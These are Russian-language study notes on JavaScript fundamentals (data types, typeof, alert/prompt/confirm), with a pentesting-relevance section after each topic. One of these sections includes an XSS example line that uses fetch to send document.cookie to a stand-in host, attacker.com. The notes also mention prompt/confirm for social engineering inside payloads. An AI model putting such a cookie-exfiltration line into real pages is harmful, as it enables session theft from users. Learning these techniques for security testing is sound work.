# JS: Типы данных

## 📌 Что это

В JavaScript **8 типов данных**. Из них **7 примитивных** и **1 объектный**. Тип определяет, какие операции можно делать с данными и как они хранятся в памяти.

---

## 🔢 1. `number` — числа

Любые числа: целые и с плавающей точкой. Можно выполнять арифметику: `+`, `-`, `*`, `/`.

```js
let a = 3;
let b = 3;
alert(a + b);        // 6
alert(a / 2);        // 1.5
```

⚠️ **Ограничение:** диапазон ±(2⁵³ − 1). Для больших чисел — `bigint`.

---

## ♾️ 2. `Infinity` — бесконечность

Математическая бесконечность. Возникает при делении на ноль.

```js
let inf = 1 / 0;
alert(inf);          // Infinity
alert(-1 / 0);       // -Infinity
```

---

## ❌ 3. `NaN` — Not a Number

Результат некорректной математической операции.

```js
alert('text' / 13);  // NaN
alert(NaN / 13);     // NaN
alert(NaN + 5);      // NaN
```

⚠️ **Исключение:**
```js
alert(NaN ** 0);     // 1 (любое число в степени 0 = 1)
```

---

## 🐘 4. `bigint` — большие числа

Для чисел **произвольной длины**. Объявляется с `n` в конце.

```js
let big = 31241324325424231421342141234124123412432n;
alert(big);
```

⚠️ **Ограничение:** поддерживается в Firefox, Chrome, Edge, Safari. **Не работает в IE.**

---

## 📝 5. `string` — строки

Текст в кавычках: `""`, `''`, `` `` ``. Шаблонные строки (`` `` ``) позволяют вставлять значения через `${...}`.

```js
alert("hello");
alert('hello');
alert(`hello ${6 / 3}`);   // hello 2
```

⚠️ **Важно:** `${...}` работает **только** внутри обратных кавычек `` `` ``. В `""` и `''` — не сработает.

```js
alert("hello ${6/3}");     // hello ${6/3} — просто текст
```

---

## ✅❌ 6. `boolean` — логический тип

Только два значения: `true` или `false`.

```js
let yes = true;
let no = false;
let isBigger = 5 > 1;
alert(isBigger);           // true
```

---

## 🕳️ 7. `null` — пустота

Означает **«значение неизвестно»** или **«пусто»**.

```js
let age = null;
```

Используется, когда ты **сознательно** ставишь пустое значение.

---

## 👻 8. `undefined` — не присвоено

Означает **«значение не было присвоено»**.

```js
let age;
alert(age);                // undefined
```

Разница с `null`:
- `null` — ты сам поставил пустоту.
- `undefined` — значение по умолчанию, потому что ничего не поставили.

---

## 🔍 Оператор `typeof`

Показывает тип данных в переменной. Две формы:

```js
typeof x
typeof(x)
```

Примеры:
```js
typeof 5              // "number"
typeof "text"         // "string"
typeof true           // "boolean"
typeof undefined      // "undefined"
typeof null           // "object"  ⚠️ ошибка языка
typeof {}             // "object"
typeof []             // "object"
typeof function(){}   // "function"
```

⚠️ **Известный баг:** `typeof null` возвращает `"object"` — это ошибка в языке, которую не исправляют для обратной совместимости.

---

## 📊 Сводная таблица

| Тип | Пример | Примитив? |
|-----|--------|-----------|
| `number` | `5`, `3.14` | ✅ |
| `bigint` | `123n` | ✅ |
| `string` | `"hi"`, `` `hi` `` | ✅ |
| `boolean` | `true`, `false` | ✅ |
| `null` | `null` | ✅ |
| `undefined` | `undefined` | ✅ |
| `symbol` | `Symbol()` | ✅ |
| `object` | `{}`, `[]` | ❌ |

---

## 🎯 Связь с пентестом

- **`typeof`** помогает понять, что вернул `document.cookie` или данные из URL.
- **`null` / `undefined`** — частые причины багов, приводящих к уязвимостям (например, Prototype Pollution).
- **Шаблонные строки** `` `${...}` `` часто используются в XSS-payload'ах для подстановки данных:
  ```js
  fetch(`https://attacker.com/?c=${document.cookie}`)
  ```
- **`NaN`** — если сервер ожидает число, а получает `NaN`, может упасть или повести себя непредсказуемо.

# JS: Взаимодействие — alert, prompt, confirm

## 📌 Что это

Три встроенные функции браузера для взаимодействия с пользователем. **Работают только в браузере** — в Node.js их нет.

---

## 💬 `alert(message)`

Показывает сообщение и ждёт нажатия **ОК**.

```js
alert('hello');
```

Возвращает `undefined`. Ничего нельзя ввести — только прочитать.

---

## ⌨️ `prompt(title, default)`

Модальное окно с полем ввода и кнопками **ОК / Отмена**.

```js
let result = prompt('Как тебя зовут?');
```

**Параметры:**
- `title` — текст вопроса (обязательно).
- `default` — начальное значение в поле (опционально).

**Возвращает:**
- **Строку**, если пользователь ввёл что-то и нажал ОК.
- **`null`**, если нажал Отмена или закрыл окно.
- **Пустую строку** `''`, если нажал ОК с пустым полем.

**Пример с default:**
```js
let name = prompt('Как тебя зовут?', 'Гость');
alert(`Привет, ${name}!`);
```

⚠️ **Для IE** всегда указывай второй параметр, иначе окно выглядит криво:
```js
let name = prompt('Как тебя зовут?', '');   // ← пустая строка как default
```

---

## ❓ `confirm(question)`

Модальное окно с вопросом и кнопками **ОК / Отмена**.

```js
let isBoss = confirm('Ты босс?');
alert(isBoss);
```

**Возвращает:**
- `true` — если нажата **ОК**.
- `false` — если нажата **Отмена** или закрыто окно.

---

## 📊 Сводная таблица

| Функция | Что показывает | Что возвращает |
|---------|----------------|----------------|
| `alert` | Сообщение + ОК | `undefined` |
| `prompt` | Вопрос + поле ввода + ОК/Отмена | Строка или `null` |
| `confirm` | Вопрос + ОК/Отмена | `true` или `false` |

---

## 🎯 Связь с пентестом

- **`alert()`** — стандартный способ подтвердить XSS: `alert(1)` или `alert(document.domain)`.
- **`prompt()` / `confirm()`** — иногда используются в XSS для сбора данных от жертвы (социальная инженерия внутри payload'а).
- Понимание того, что эти функции **не работают в Node.js** — важно для отладки payload'ов: тестируй их в браузере (DevTools), а не через `node`.
